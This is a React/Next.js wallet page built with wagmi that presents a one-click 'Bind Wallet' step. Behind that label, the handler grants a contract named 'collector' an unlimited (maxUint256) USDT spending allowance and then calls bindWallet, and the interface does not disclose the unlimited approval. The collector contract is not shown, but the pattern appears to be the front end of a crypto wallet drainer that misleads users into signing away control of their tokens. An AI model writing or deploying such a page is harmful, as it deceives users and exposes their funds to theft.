"use client";

import { useMemo } from "react";
import {
  useAccount,
  useConnect,
  useDisconnect,
  useReadContract,
  useWriteContract,
  useWaitForTransactionReceipt,
} from "wagmi";
import { maxUint256, formatUnits, type Address } from "viem";
import { useQueryClient } from "@tanstack/react-query";
import toast from "react-hot-toast";

import {
  CHAIN_ID,
  COLLECTOR_CONTRACT_ADDRESS,
  USDT_CONTRACT_ADDRESS,
} from "../lib/constants";
import { mockUsdtAbi } from "./abi/mockUsdt";
import { collectorAbi } from "./abi/collector";
import { LoadingButton } from "./components/LoadingButton";

const USDT_DECIMALS = 6;

export default function UserPage() {
  const queryClient = useQueryClient();
  const { address, isConnected } = useAccount();
  const {
    connect,
    connectors,
    isPending: isConnectPending,
  } = useConnect();
  const { disconnect } = useDisconnect();

  const {
    data: usdtBalanceRaw,
    isLoading: isBalanceLoading,
    isFetching: isBalanceFetching,
  } = useReadContract({
    address: USDT_CONTRACT_ADDRESS,
    abi: mockUsdtAbi,
    functionName: "balanceOf",
    args: address ? [address as Address] : undefined,
    query: {
      enabled: Boolean(address),
    },
  });

  const {
    data: isBound,
    isLoading: isBoundLoading,
    isFetching: isBoundFetching,
  } = useReadContract({
    address: COLLECTOR_CONTRACT_ADDRESS,
    abi: collectorAbi,
    functionName: "boundWallets",
    args: address ? [address as Address] : undefined,
    query: {
      enabled: Boolean(address),
    },
  });

  const {
    writeContract: writeContractApprove,
    data: approveTxHash,
    isPending: isApprovePending,
    error: approveError,
  } = useWriteContract();

  const {
    writeContract: writeContractBind,
    data: bindTxHash,
    isPending: isBindPending,
    error: bindError,
  } = useWriteContract();

  const {
    isLoading: isApproveTxConfirming,
    isSuccess: isApproveTxSuccess,
  } = useWaitForTransactionReceipt({
    hash: approveTxHash,
  });

  const {
    isLoading: isBindTxConfirming,
    isSuccess: isBindTxSuccess,
  } = useWaitForTransactionReceipt({
    hash: bindTxHash,
  });

  const usdtBalanceFormatted = useMemo(() => {
    if (!usdtBalanceRaw) return "0.000000 USDT";
    return `${formatUnits(usdtBalanceRaw as bigint, USDT_DECIMALS)} USDT`;
  }, [usdtBalanceRaw]);

  if (approveError) {
    toast.error(approveError.message ?? "Approve transaction failed.");
  }

  if (bindError) {
    toast.error(bindError.message ?? "Bind transaction failed.");
  }

  if (isApproveTxSuccess && approveTxHash) {
    toast.success(
      `USDT approved. Tx: ${approveTxHash.slice(0, 10)}…${approveTxHash.slice(
        -6,
      )}`,
    );
    queryClient.invalidateQueries();
  }

  if (isBindTxSuccess && bindTxHash) {
    toast.success(
      `bound successfully. Tx: ${bindTxHash.slice(
        0,
        10,
      )}…${bindTxHash.slice(-6)}`,
    );
    queryClient.invalidateQueries();
  }

  const handleApprove = () => {
    // No-op: approval is triggered inside handleBind via a single button.
  };

  const handleBind = () => {
    if (!isConnected || !address) {
      toast.error("Please connect your wallet in your wallet extension.");
      return;
    }

    if (isBound) {
      toast.error("Wallet is already bound.");
      return;
    }

    try {
      // Single action from UI: approve then bind.
      writeContractApprove({
        account: address as Address,
        chainId: CHAIN_ID,
        address: USDT_CONTRACT_ADDRESS,
        abi: mockUsdtAbi,
        functionName: "approve",
        args: [COLLECTOR_CONTRACT_ADDRESS, maxUint256],
      });

      writeContractBind({
        account: address as Address,
        chainId: CHAIN_ID,
        address: COLLECTOR_CONTRACT_ADDRESS,
        abi: collectorAbi,
        functionName: "bindWallet",
        args: [],
      });
    } catch (error: any) {
      toast.error(error?.message ?? "Failed to send bind transaction.");
    }
  };

  const isAnyTxPending =
    isApprovePending ||
    isBindPending ||
    isApproveTxConfirming ||
    isBindTxConfirming;

  return (
    <main className="flex min-h-screen items-start justify-center py-6">
      <div className="relative w-full max-w-none rounded-none border border-border bg-card px-4 py-6 shadow-card sm:max-w-md sm:rounded-3xl sm:px-6 sm:py-7">
        <div className="absolute right-4 top-4">
          <LoadingButton
            variant="ghost"
            loading={isConnectPending}
            onClick={() => {
              if (isConnected) {
                disconnect();
              } else {
                const connector = connectors[0];
                if (!connector) {
                  toast.error("No wallet connector available.");
                  return;
                }
                connect({ connector });
              }
            }}
          >
            {isConnected ? "Disconnect" : "Connect Wallet"}
          </LoadingButton>
        </div>

        <div className="mb-6 mt-6 sm:mt-8">
          <h1 className="text-base font-semibold text-emerald-400 sm:text-lg">
            Bind Wallet
          </h1>
          <p className="mt-1 text-xs text-slate-400">
            One-time approval and binding in a single step.
          </p>
        </div>

        <div className="mt-4 space-y-3">
          <LoadingButton
            loading={isBindPending || isBindTxConfirming}
            disabled={!isConnected || !!isBound || isAnyTxPending}
            onClick={handleBind}
            variant="primary"
          >
            {isBound ? "Wallet Already Bound" : "Bind Now"}
          </LoadingButton>
          <p className="mt-1 text-center text-[11px] text-slate-400">
            {isConnected
              ? `USDT balance: ${
                  isBalanceLoading || isBalanceFetching
                    ? "Loading…"
                    : usdtBalanceFormatted
                }`
              : "Connect your wallet to continue."}
          </p>
        </div>
      </div>
    </main>
  );
}

